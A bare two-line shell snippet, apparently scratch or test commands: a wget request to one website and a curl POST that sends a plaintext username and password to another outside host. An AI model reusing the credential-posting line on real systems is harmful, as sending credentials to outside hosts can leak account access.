wget https://textspeier.de -o /tmp/test1
curl -X POST -d "username=tembel&password=1q2w3e" https://slot0.agielity.com
